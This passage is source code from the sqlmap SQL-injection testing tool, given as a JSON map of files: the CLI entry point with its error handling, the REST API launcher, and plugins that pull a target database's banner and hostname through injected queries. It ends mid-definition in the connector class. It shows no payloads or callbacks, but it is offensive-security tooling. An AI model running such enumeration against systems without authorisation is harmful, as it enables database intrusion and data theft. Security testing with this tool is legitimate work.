{"sqlmap.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\ntry:\n    import sys\n\n    sys.dont_write_bytecode = True\n\n    try:\n        __import__(\"lib.utils.versioncheck\")  # this has to be the first non-standard import\n    except ImportError:\n        sys.exit(\"[!] wrong installation detected (missing modules). Visit 'https://github.com/sqlmapproject/sqlmap/#installation' for further details\")\n\n    import bdb\n    import glob\n    import inspect\n    import json\n    import logging\n    import os\n    import re\n    import shutil\n    import sys\n    import tempfile\n    import threading\n    import time\n    import traceback\n    import warnings\n\n    if \"--deprecations\" not in sys.argv:\n        warnings.filterwarnings(action=\"ignore\", category=DeprecationWarning)\n    else:\n        warnings.resetwarnings()\n        warnings.filterwarnings(action=\"ignore\", message=\"'crypt'\", category=DeprecationWarning)\n        warnings.simplefilter(\"ignore\", category=ImportWarning)\n        if sys.version_info >= (3, 0):\n            warnings.simplefilter(\"ignore\", category=ResourceWarning)\n\n    warnings.filterwarnings(action=\"ignore\", message=\"Python 2 is no longer supported\")\n    warnings.filterwarnings(action=\"ignore\", message=\".*was already imported\", category=UserWarning)\n    warnings.filterwarnings(action=\"ignore\", message=\".*using a very old release\", category=UserWarning)\n    warnings.filterwarnings(action=\"ignore\", message=\".*default buffer size will be used\", category=RuntimeWarning)\n    warnings.filterwarnings(action=\"ignore\", category=UserWarning, module=\"psycopg2\")\n\n    from lib.core.data import logger\n\n    from lib.core.common import banner\n    from lib.core.common import checkPipedInput\n    from lib.core.common import checkSums\n    from lib.core.common import createGithubIssue\n    from lib.core.common import dataToStdout\n    from lib.core.common import extractRegexResult\n    from lib.core.common import filterNone\n    from lib.core.common import getDaysFromLastUpdate\n    from lib.core.common import getFileItems\n    from lib.core.common import getSafeExString\n    from lib.core.common import maskSensitiveData\n    from lib.core.common import openFile\n    from lib.core.common import setPaths\n    from lib.core.common import weAreFrozen\n    from lib.core.convert import getUnicode\n    from lib.core.common import setColor\n    from lib.core.common import unhandledExceptionMessage\n    from lib.core.compat import LooseVersion\n    from lib.core.compat import xrange\n    from lib.core.data import cmdLineOptions\n    from lib.core.data import conf\n    from lib.core.data import kb\n    from lib.core.datatype import OrderedSet\n    from lib.core.enums import MKSTEMP_PREFIX\n    from lib.core.exception import SqlmapBaseException\n    from lib.core.exception import SqlmapShellQuitException\n    from lib.core.exception import SqlmapSilentQuitException\n    from lib.core.exception import SqlmapUserQuitException\n    from lib.core.option import init\n    from lib.core.option import initOptions\n    from lib.core.patch import dirtyPatches\n    from lib.core.patch import resolveCrossReferences\n    from lib.core.settings import GIT_PAGE\n    from lib.core.settings import IS_WIN\n    from lib.core.settings import LAST_UPDATE_NAGGING_DAYS\n    from lib.core.settings import LEGAL_DISCLAIMER\n    from lib.core.settings import THREAD_FINALIZATION_TIMEOUT\n    from lib.core.settings import UNICODE_ENCODING\n    from lib.core.settings import VERSION\n    from lib.parse.cmdline import cmdLineParser\n    from lib.utils.crawler import crawl\nexcept KeyboardInterrupt:\n    errMsg = \"user aborted\"\n\n    if \"logger\" in globals():\n        logger.critical(errMsg)\n        raise SystemExit\n    else:\n        import time\n        sys.exit(\"\\r[%s] [CRITICAL] %s\" % (time.strftime(\"%X\"), errMsg))\n\ndef modulePath():\n    \"\"\"\n    This will get us the program's directory, even if we are frozen\n    using py2exe\n    \"\"\"\n\n    try:\n        _ = sys.executable if weAreFrozen() else __file__\n    except NameError:\n        _ = inspect.getsourcefile(modulePath)\n\n    return getUnicode(os.path.dirname(os.path.realpath(_)), encoding=sys.getfilesystemencoding() or UNICODE_ENCODING)\n\ndef checkEnvironment():\n    try:\n        os.path.isdir(modulePath())\n    except UnicodeEncodeError:\n        errMsg = \"your system does not properly handle non-ASCII paths. \"\n        errMsg += \"Please move the sqlmap's directory to the other location\"\n        logger.critical(errMsg)\n        raise SystemExit\n\n    if LooseVersion(VERSION) < LooseVersion(\"1.0\"):\n        errMsg = \"your runtime environment (e.g. PYTHONPATH) is \"\n        errMsg += \"broken. Please make sure that you are not running \"\n        errMsg += \"newer versions of sqlmap with runtime scripts for older \"\n        errMsg += \"versions\"\n        logger.critical(errMsg)\n        raise SystemExit\n\n    # Patch for pip (import) environment\n    if \"sqlmap.sqlmap\" in sys.modules:\n        for _ in (\"cmdLineOptions\", \"conf\", \"kb\"):\n            globals()[_] = getattr(sys.modules[\"lib.core.data\"], _)\n\n        for _ in (\"SqlmapBaseException\", \"SqlmapShellQuitException\", \"SqlmapSilentQuitException\", \"SqlmapUserQuitException\"):\n            globals()[_] = getattr(sys.modules[\"lib.core.exception\"], _)\n\ndef main():\n    \"\"\"\n    Main function of sqlmap when running from command line.\n    \"\"\"\n\n    try:\n        dirtyPatches()\n        resolveCrossReferences()\n        checkEnvironment()\n        setPaths(modulePath())\n        banner()\n\n        # Store original command line options for possible later restoration\n        args = cmdLineParser()\n        cmdLineOptions.update(args.__dict__ if hasattr(args, \"__dict__\") else args)\n        initOptions(cmdLineOptions)\n\n        if checkPipedInput():\n            conf.batch = True\n\n        if conf.get(\"api\"):\n            # heavy imports\n            from lib.utils.api import StdDbOut\n            from lib.utils.api import setRestAPILog\n\n            # Overwrite system standard output and standard error to write\n            # to an IPC database\n            sys.stdout = StdDbOut(conf.taskid, messagetype=\"stdout\")\n            sys.stderr = StdDbOut(conf.taskid, messagetype=\"stderr\")\n\n            setRestAPILog()\n\n        conf.showTime = True\n        dataToStdout(\"[!] legal disclaimer: %s\\n\\n\" % LEGAL_DISCLAIMER, forceOutput=True)\n        dataToStdout(\"[*] starting @ %s\\n\\n\" % time.strftime(\"%X /%Y-%m-%d/\"), forceOutput=True)\n\n        init()\n\n        if not conf.updateAll:\n            # Postponed imports (faster start)\n            if conf.smokeTest:\n                from lib.core.testing import smokeTest\n                os._exitcode = 1 - (smokeTest() or 0)\n            elif conf.vulnTest:\n                from lib.core.testing import vulnTest\n                os._exitcode = 1 - (vulnTest() or 0)\n            else:\n                from lib.controller.controller import start\n                if conf.profile:\n                    from lib.core.profiling import profile\n                    globals()[\"start\"] = start\n                    profile()\n                else:\n                    try:\n                        if conf.crawlDepth and conf.bulkFile:\n                            targets = getFileItems(conf.bulkFile)\n\n                            for i in xrange(len(targets)):\n                                target = None\n\n                                try:\n                                    kb.targets = OrderedSet()\n                                    target = targets[i]\n\n                                    if not re.search(r\"(?i)\\Ahttp[s]*://\", target):\n                                        target = \"http://%s\" % target\n\n                                    infoMsg = \"starting crawler for target URL '%s' (%d/%d)\" % (target, i + 1, len(targets))\n                                    logger.info(infoMsg)\n\n                                    crawl(target)\n                                except Exception as ex:\n                                    if target and not isinstance(ex, SqlmapUserQuitException):\n                                        errMsg = \"problem occurred while crawling '%s' ('%s')\" % (target, getSafeExString(ex))\n                                        logger.error(errMsg)\n                                    else:\n                                        raise\n                                else:\n                                    if kb.targets:\n                                        start()\n                        else:\n                            start()\n                    except Exception as ex:\n                        os._exitcode = 1\n\n                        if \"can't start new thread\" in getSafeExString(ex):\n                            errMsg = \"unable to start new threads. Please check OS (u)limits\"\n                            logger.critical(errMsg)\n                            raise SystemExit\n                        else:\n                            raise\n\n    except SqlmapUserQuitException:\n        if not conf.batch:\n            errMsg = \"user quit\"\n            logger.error(errMsg)\n\n    except (SqlmapSilentQuitException, bdb.BdbQuit):\n        pass\n\n    except SqlmapShellQuitException:\n        cmdLineOptions.sqlmapShell = False\n\n    except SqlmapBaseException as ex:\n        errMsg = getSafeExString(ex)\n        logger.critical(errMsg)\n\n        os._exitcode = 1\n\n        raise SystemExit\n\n    except KeyboardInterrupt:\n        try:\n            print()\n        except IOError:\n            pass\n\n    except EOFError:\n        print()\n\n        errMsg = \"exit\"\n        logger.error(errMsg)\n\n    except SystemExit as ex:\n        os._exitcode = ex.code or 0\n\n    except:\n        print()\n        errMsg = unhandledExceptionMessage()\n        excMsg = traceback.format_exc()\n        valid = checkSums()\n\n        os._exitcode = 255\n\n        if any(_ in excMsg for _ in (\"MemoryError\", \"Cannot allocate memory\")):\n            errMsg = \"memory exhaustion detected\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif any(_ in excMsg for _ in (\"No space left\", \"Disk quota exceeded\", \"Disk full while accessing\")):\n            errMsg = \"no space left on output device\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif any(_ in excMsg for _ in (\"The paging file is too small\",)):\n            errMsg = \"no space left for paging file\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"Access is denied\", \"subprocess\", \"metasploit\")):\n            errMsg = \"permission error occurred while running Metasploit\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"Permission denied\", \"metasploit\")):\n            errMsg = \"permission error occurred while using Metasploit\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"Read-only file system\" in excMsg:\n            errMsg = \"output device is mounted as read-only\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"Insufficient system resources\" in excMsg:\n            errMsg = \"resource exhaustion detected\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"OperationalError: disk I/O error\" in excMsg:\n            errMsg = \"I/O error on output device\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"Violation of BIDI\" in excMsg:\n            errMsg = \"invalid URL (violation of Bidi IDNA rule - RFC 5893)\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"Invalid IPv6 URL\" in excMsg:\n            errMsg = \"invalid URL ('%s')\" % excMsg.strip().split('\\n')[-1]\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"_mkstemp_inner\" in excMsg:\n            errMsg = \"there has been a problem while accessing temporary files\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif any(_ in excMsg for _ in (\"tempfile.mkdtemp\", \"tempfile.mkstemp\", \"tempfile.py\")):\n            errMsg = \"unable to write to the temporary directory '%s'. \" % tempfile.gettempdir()\n            errMsg += \"Please make sure that your disk is not full and \"\n            errMsg += \"that you have sufficient write permissions to \"\n            errMsg += \"create temporary files and/or directories\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"Permission denied: '\" in excMsg:\n            match = re.search(r\"Permission denied: '([^']*)\", excMsg)\n            errMsg = \"permission error occurred while accessing file '%s'\" % match.group(1)\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"twophase\", \"sqlalchemy\")):\n            errMsg = \"please update the 'sqlalchemy' package (>= 1.1.11) \"\n            errMsg += \"(Reference: 'https://qiita.com/tkprof/items/7d7b2d00df9c5f16fffe')\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"invalid maximum character passed to PyUnicode_New\" in excMsg and re.search(r\"\\A3\\.[34]\", sys.version) is not None:\n            errMsg = \"please upgrade the Python version (>= 3.5) \"\n            errMsg += \"(Reference: 'https://bugs.python.org/issue18183')\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"scramble_caching_sha2\", \"TypeError\")):\n            errMsg = \"please downgrade the 'PyMySQL' package (=< 0.8.1) \"\n            errMsg += \"(Reference: 'https://github.com/PyMySQL/PyMySQL/issues/700')\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"must be pinned buffer, not bytearray\" in excMsg:\n            errMsg = \"error occurred at Python interpreter which \"\n            errMsg += \"is fixed in 2.7. Please update accordingly \"\n            errMsg += \"(Reference: 'https://bugs.python.org/issue8104')\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"OSError: [Errno 22] Invalid argument: '\", \"importlib\")):\n            errMsg = \"unable to read file '%s'\" % extractRegexResult(r\"OSError: \\[Errno 22\\] Invalid argument: '(?P<result>[^']+)\", excMsg)\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"hash_randomization\" in excMsg:\n            errMsg = \"error occurred at Python interpreter which \"\n            errMsg += \"is fixed in 2.7.3. Please update accordingly \"\n            errMsg += \"(Reference: 'https://docs.python.org/2/library/sys.html')\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"AttributeError: unable to access item\" in excMsg and re.search(r\"3\\.11\\.\\d+a\", sys.version):\n            errMsg = \"there is a known issue when sqlmap is run with ALPHA versions of Python 3.11. \"\n            errMsg += \"Please downgrade to some stable Python version\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"Resource temporarily unavailable\", \"os.fork()\", \"dictionaryAttack\")):\n            errMsg = \"there has been a problem while running the multiprocessing hash cracking. \"\n            errMsg += \"Please rerun with option '--threads=1'\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"can't start new thread\" in excMsg:\n            errMsg = \"there has been a problem while creating new thread instance. \"\n            errMsg += \"Please make sure that you are not running too many processes\"\n            if not IS_WIN:\n                errMsg += \" (or increase the 'ulimit -u' value)\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"can't allocate read lock\" in excMsg:\n            errMsg = \"there has been a problem in regular socket operation \"\n            errMsg += \"('%s')\" % excMsg.strip().split('\\n')[-1]\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"pymysql\", \"configparser\")):\n            errMsg = \"wrong initialization of 'pymsql' detected (using Python3 dependencies)\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"ntlm\", \"socket.error, err\", \"SyntaxError\")):\n            errMsg = \"wrong initialization of 'python-ntlm' detected (using Python2 syntax)\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"drda\", \"to_bytes\")):\n            errMsg = \"wrong initialization of 'drda' detected (using Python3 syntax)\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"'WebSocket' object has no attribute 'status'\" in excMsg:\n            errMsg = \"wrong websocket library detected\"\n            errMsg += \" (Reference: 'https://github.com/sqlmapproject/sqlmap/issues/4572#issuecomment-775041086')\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"window = tkinter.Tk()\",)):\n            errMsg = \"there has been a problem in initialization of GUI interface \"\n            errMsg += \"('%s')\" % excMsg.strip().split('\\n')[-1]\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif any(_ in excMsg for _ in (\"unable to access item 'liveTest'\",)):\n            errMsg = \"detected usage of files from different versions of sqlmap\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif any(_ in errMsg for _ in (\": 9.9.9#\",)):\n            errMsg = \"LOL :)\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif kb.get(\"dumpKeyboardInterrupt\"):\n            raise SystemExit\n\n        elif any(_ in excMsg for _ in (\"Broken pipe\",)):\n            raise SystemExit\n\n        elif valid is False:\n            errMsg = \"code checksum failed (turning off automatic issue creation). \"\n            errMsg += \"You should retrieve the latest development version from official GitHub \"\n            errMsg += \"repository at '%s'\" % GIT_PAGE\n            logger.critical(errMsg)\n            print()\n            dataToStdout(excMsg)\n            raise SystemExit\n\n        elif any(_ in \"%s\\n%s\" % (errMsg, excMsg) for _ in (\"tamper/\", \"waf/\", \"--engagement-dojo\")):\n            logger.critical(errMsg)\n            print()\n            dataToStdout(excMsg)\n            raise SystemExit\n\n        elif any(_ in excMsg for _ in (\"ImportError\", \"ModuleNotFoundError\", \"<frozen\", \"Can't find file for module\", \"SAXReaderNotAvailable\", \"<built-in function compile> returned NULL without setting an exception\", \"source code string cannot contain null bytes\", \"No module named\", \"tp_name field\", \"module 'sqlite3' has no attribute 'OperationalError'\")):\n            errMsg = \"invalid runtime environment ('%s')\" % excMsg.split(\"Error: \")[-1].strip()\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"SyntaxError: Non-ASCII character\", \".py on line\", \"but no encoding declared\")):\n            errMsg = \"invalid runtime environment ('%s')\" % excMsg.split(\"Error: \")[-1].strip()\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"FileNotFoundError: [Errno 2] No such file or directory\", \"cwd = os.getcwd()\")):\n            errMsg = \"invalid runtime environment ('%s')\" % excMsg.split(\"Error: \")[-1].strip()\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"PermissionError: [WinError 5]\", \"multiprocessing\")):\n            errMsg = \"there is a permission problem in running multiprocessing on this system. \"\n            errMsg += \"Please rerun with '--disable-multi'\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"No such file\", \"_'\")):\n            errMsg = \"corrupted installation detected ('%s'). \" % excMsg.strip().split('\\n')[-1]\n            errMsg += \"You should retrieve the latest development version from official GitHub \"\n            errMsg += \"repository at '%s'\" % GIT_PAGE\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"No such file\", \"sqlmap.conf\", \"Test\")):\n            errMsg = \"you are trying to run (hidden) development tests inside the production environment\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif all(_ in excMsg for _ in (\"HTTPNtlmAuthHandler\", \"'str' object has no attribute 'decode'\")):\n            errMsg = \"package 'python-ntlm' has a known compatibility issue with the \"\n            errMsg += \"Python 3 (Reference: 'https://github.com/mullender/python-ntlm/pull/61')\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"'DictObject' object has no attribute '\" in excMsg and all(_ in errMsg for _ in (\"(fingerprinted)\", \"(identified)\")):\n            errMsg = \"there has been a problem in enumeration. \"\n            errMsg += \"Because of a considerable chance of false-positive case \"\n            errMsg += \"you are advised to rerun with switch '--flush-session'\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"database disk image is malformed\" in excMsg:\n            errMsg = \"local session file seems to be malformed. Please rerun with '--flush-session'\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"AttributeError: 'module' object has no attribute 'F_GETFD'\" in excMsg:\n            errMsg = \"invalid runtime (\\\"%s\\\") \" % excMsg.split(\"Error: \")[-1].strip()\n            errMsg += \"(Reference: 'https://stackoverflow.com/a/38841364' & 'https://bugs.python.org/issue24944#msg249231')\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        elif \"bad marshal data (unknown type code)\" in excMsg:\n            match = re.search(r\"\\s*(.+)\\s+ValueError\", excMsg)\n            errMsg = \"one of your .pyc files are corrupted%s\" % (\" ('%s')\" % match.group(1) if match else \"\")\n            errMsg += \". Please delete .pyc files on your system to fix the problem\"\n            logger.critical(errMsg)\n            raise SystemExit\n\n        for match in re.finditer(r'File \"(.+?)\", line', excMsg):\n            file_ = match.group(1)\n            try:\n                file_ = os.path.relpath(file_, os.path.dirname(__file__))\n            except ValueError:\n                pass\n            file_ = file_.replace(\"\\\\\", '/')\n            if \"../\" in file_:\n                file_ = re.sub(r\"(\\.\\./)+\", '/', file_)\n            else:\n                file_ = file_.lstrip('/')\n            file_ = re.sub(r\"/{2,}\", '/', file_)\n            excMsg = excMsg.replace(match.group(1), file_)\n\n        errMsg = maskSensitiveData(errMsg)\n        excMsg = maskSensitiveData(excMsg)\n\n        if conf.get(\"api\") or not valid:\n            logger.critical(\"%s\\n%s\" % (errMsg, excMsg))\n        else:\n            logger.critical(errMsg)\n            dataToStdout(\"%s\\n\" % setColor(excMsg.strip(), level=logging.CRITICAL))\n            createGithubIssue(errMsg, excMsg)\n\n    finally:\n        kb.threadContinue = False\n\n        if (getDaysFromLastUpdate() or 0) > LAST_UPDATE_NAGGING_DAYS:\n            warnMsg = \"your sqlmap version is outdated\"\n            logger.warning(warnMsg)\n\n        if conf.get(\"showTime\"):\n            dataToStdout(\"\\n[*] ending @ %s\\n\\n\" % time.strftime(\"%X /%Y-%m-%d/\"), forceOutput=True)\n\n        kb.threadException = True\n\n        if kb.get(\"tempDir\"):\n            for prefix in (MKSTEMP_PREFIX.IPC, MKSTEMP_PREFIX.TESTING, MKSTEMP_PREFIX.COOKIE_JAR, MKSTEMP_PREFIX.BIG_ARRAY):\n                for filepath in glob.glob(os.path.join(kb.tempDir, \"%s*\" % prefix)):\n                    try:\n                        os.remove(filepath)\n                    except OSError:\n                        pass\n\n            if not filterNone(filepath for filepath in glob.glob(os.path.join(kb.tempDir, '*')) if not any(filepath.endswith(_) for _ in (\".lock\", \".exe\", \".so\", '_'))):  # ignore junk files\n                try:\n                    shutil.rmtree(kb.tempDir, ignore_errors=True)\n                except OSError:\n                    pass\n\n        if conf.get(\"hashDB\"):\n            conf.hashDB.flush(True)\n            conf.hashDB.close()         # NOTE: because of PyPy\n\n        if conf.get(\"harFile\"):\n            try:\n                with openFile(conf.harFile, \"w+b\") as f:\n                    json.dump(conf.httpCollector.obtain(), fp=f, indent=4, separators=(',', ': '))\n            except SqlmapBaseException as ex:\n                errMsg = getSafeExString(ex)\n                logger.critical(errMsg)\n\n        if conf.get(\"api\"):\n            conf.databaseCursor.disconnect()\n\n        if conf.get(\"dumper\"):\n            conf.dumper.flush()\n\n        # short delay for thread finalization\n        _ = time.time()\n        while threading.active_count() > 1 and (time.time() - _) > THREAD_FINALIZATION_TIMEOUT:\n            time.sleep(0.01)\n\n        if cmdLineOptions.get(\"sqlmapShell\"):\n            cmdLineOptions.clear()\n            conf.clear()\n            kb.clear()\n            conf.disableBanner = True\n            main()\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except KeyboardInterrupt:\n        pass\n    except SystemExit:\n        raise\n    except:\n        traceback.print_exc()\n    finally:\n        # Reference: http://stackoverflow.com/questions/1635080/terminate-a-multi-thread-python-program\n        if threading.active_count() > 1:\n            os._exit(getattr(os, \"_exitcode\", 0))\n        else:\n            sys.exit(getattr(os, \"_exitcode\", 0))\nelse:\n    # cancelling postponed imports (because of CI/CD checks)\n    __import__(\"lib.controller.controller\")\n", "sqlmapapi.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport sys\n\nsys.dont_write_bytecode = True\n\n__import__(\"lib.utils.versioncheck\")  # this has to be the first non-standard import\n\nimport logging\nimport os\nimport warnings\n\nwarnings.filterwarnings(action=\"ignore\", category=UserWarning)\nwarnings.filterwarnings(action=\"ignore\", category=DeprecationWarning)\n\ntry:\n    from optparse import OptionGroup\n    from optparse import OptionParser as ArgumentParser\n\n    ArgumentParser.add_argument = ArgumentParser.add_option\n\n    def _add_argument(self, *args, **kwargs):\n        return self.add_option(*args, **kwargs)\n\n    OptionGroup.add_argument = _add_argument\n\nexcept ImportError:\n    from argparse import ArgumentParser\n\nfinally:\n    def get_actions(instance):\n        for attr in (\"option_list\", \"_group_actions\", \"_actions\"):\n            if hasattr(instance, attr):\n                return getattr(instance, attr)\n\n    def get_groups(parser):\n        return getattr(parser, \"option_groups\", None) or getattr(parser, \"_action_groups\")\n\n    def get_all_options(parser):\n        retVal = set()\n\n        for option in get_actions(parser):\n            if hasattr(option, \"option_strings\"):\n                retVal.update(option.option_strings)\n            else:\n                retVal.update(option._long_opts)\n                retVal.update(option._short_opts)\n\n        for group in get_groups(parser):\n            for option in get_actions(group):\n                if hasattr(option, \"option_strings\"):\n                    retVal.update(option.option_strings)\n                else:\n                    retVal.update(option._long_opts)\n                    retVal.update(option._short_opts)\n\n        return retVal\n\nfrom lib.core.common import getUnicode\nfrom lib.core.common import setPaths\nfrom lib.core.data import logger\nfrom lib.core.patch import dirtyPatches\nfrom lib.core.patch import resolveCrossReferences\nfrom lib.core.settings import RESTAPI_DEFAULT_ADAPTER\nfrom lib.core.settings import RESTAPI_DEFAULT_ADDRESS\nfrom lib.core.settings import RESTAPI_DEFAULT_PORT\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.utils.api import client\nfrom lib.utils.api import server\n\ntry:\n    from sqlmap import modulePath\nexcept ImportError:\n    def modulePath():\n        return getUnicode(os.path.dirname(os.path.realpath(__file__)), encoding=sys.getfilesystemencoding() or UNICODE_ENCODING)\n\ndef main():\n    \"\"\"\n    REST-JSON API main function\n    \"\"\"\n\n    dirtyPatches()\n    resolveCrossReferences()\n\n    # Set default logging level to debug\n    logger.setLevel(logging.DEBUG)\n\n    # Initialize paths\n    setPaths(modulePath())\n\n    # Parse command line options\n    apiparser = ArgumentParser()\n    apiparser.add_argument(\"-s\", \"--server\", help=\"Run as a REST-JSON API server\", action=\"store_true\")\n    apiparser.add_argument(\"-c\", \"--client\", help=\"Run as a REST-JSON API client\", action=\"store_true\")\n    apiparser.add_argument(\"-H\", \"--host\", help=\"Host of the REST-JSON API server (default \\\"%s\\\")\" % RESTAPI_DEFAULT_ADDRESS, default=RESTAPI_DEFAULT_ADDRESS)\n    apiparser.add_argument(\"-p\", \"--port\", help=\"Port of the REST-JSON API server (default %d)\" % RESTAPI_DEFAULT_PORT, default=RESTAPI_DEFAULT_PORT, type=int)\n    apiparser.add_argument(\"--adapter\", help=\"Server (bottle) adapter to use (default \\\"%s\\\")\" % RESTAPI_DEFAULT_ADAPTER, default=RESTAPI_DEFAULT_ADAPTER)\n    apiparser.add_argument(\"--database\", help=\"Set IPC database filepath (optional)\")\n    apiparser.add_argument(\"--username\", help=\"Basic authentication username (optional)\")\n    apiparser.add_argument(\"--password\", help=\"Basic authentication password (optional)\")\n    (args, _) = apiparser.parse_known_args() if hasattr(apiparser, \"parse_known_args\") else apiparser.parse_args()\n\n\n    # Start the client or the server\n    if args.server:\n        server(args.host, args.port, adapter=args.adapter, username=args.username, password=args.password, database=args.database)\n    elif args.client:\n        client(args.host, args.port, username=args.username, password=args.password)\n    else:\n        apiparser.print_help()\n\nif __name__ == \"__main__\":\n    main()\n", "plugins/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "plugins/generic/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setOs\nfrom lib.parse.banner import bannerParser\nfrom lib.request import inject\nfrom plugins.generic.custom import Custom\nfrom plugins.generic.databases import Databases\nfrom plugins.generic.entries import Entries\nfrom plugins.generic.search import Search\nfrom plugins.generic.users import Users\n\nclass Enumeration(Custom, Databases, Entries, Search, Users):\n    \"\"\"\n    This class defines generic enumeration functionalities for plugins.\n    \"\"\"\n\n    def __init__(self):\n        kb.data.has_information_schema = False\n        kb.data.banner = None\n        kb.data.hostname = \"\"\n        kb.data.processChar = None\n\n        Custom.__init__(self)\n        Databases.__init__(self)\n        Entries.__init__(self)\n        Search.__init__(self)\n        Users.__init__(self)\n\n    def getBanner(self):\n        if not conf.getBanner:\n            return\n\n        if kb.data.banner is None:\n            infoMsg = \"fetching banner\"\n            logger.info(infoMsg)\n\n            if Backend.isDbms(DBMS.DB2):\n                rootQuery = queries[DBMS.DB2].banner\n                for query in (rootQuery.query, rootQuery.query2):\n                    kb.data.banner = unArrayizeValue(inject.getValue(query, safeCharEncode=False))\n                    if kb.data.banner:\n                        break\n            else:\n                query = queries[Backend.getIdentifiedDbms()].banner.query\n                kb.data.banner = unArrayizeValue(inject.getValue(query, safeCharEncode=False))\n\n            bannerParser(kb.data.banner)\n\n            if conf.os and conf.os == \"windows\":\n                kb.bannerFp[\"type\"] = set([\"Windows\"])\n\n            elif conf.os and conf.os == \"linux\":\n                kb.bannerFp[\"type\"] = set([\"Linux\"])\n\n            elif conf.os:\n                kb.bannerFp[\"type\"] = set([\"%s%s\" % (conf.os[0].upper(), conf.os[1:])])\n\n            if conf.os:\n                setOs()\n\n        return kb.data.banner\n\n    def getHostname(self):\n        infoMsg = \"fetching server hostname\"\n        logger.info(infoMsg)\n\n        query = queries[Backend.getIdentifiedDbms()].hostname.query\n\n        if not kb.data.hostname:\n            kb.data.hostname = unArrayizeValue(inject.getValue(query, safeCharEncode=False))\n\n        return kb.data.hostname\n", "plugins/generic/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapFilePathException\nfrom lib.core.exception import SqlmapUndefinedMethod\n\nclass Connector(object):\n    \"\"\"\n    This class defines generic dbms protocol functionalities for plugins.\n    \"\"\"\n\n    def __init__(self):\n        self.connector = None\n        self.cursor = None\n        self.hostname = None\n\n    def initConnection(self):\n        self.user = conf.dbmsUser or \"\"\n        self.password = conf.dbmsPass or \"\"\n        self.hostname = conf.hostname\n        self.port = conf.port\n        self.db = conf.dbmsDb\n\n    def printConnected(self):\n        if self.hostname and self.port:\n            infoMsg = \"connection to %s server '%s:%d' established\" % (conf.dbms, self.hostname, self.port)\n            logger.info(infoMsg)\n\n    def closed(self):\n        if self.hostname and self.port:\n            infoMsg = \"connection to %s server '%s:%d' closed\" % (conf.dbms, self.hostname, self.port)\n            logger.info(infoMsg)\n\n        self.connector = None\n        self.cursor = None\n\n    def initCursor(self):\n        self.cursor = self.connector.cursor()\n\n    def close(self):\n        try:\n            if self.cursor:\n                self.cursor.close()\n            if self.connector:\n                self.connector.close()\n        except Exception as ex:\n            logger.debug(ex)\n        finally:\n            self.closed()\n\n    def 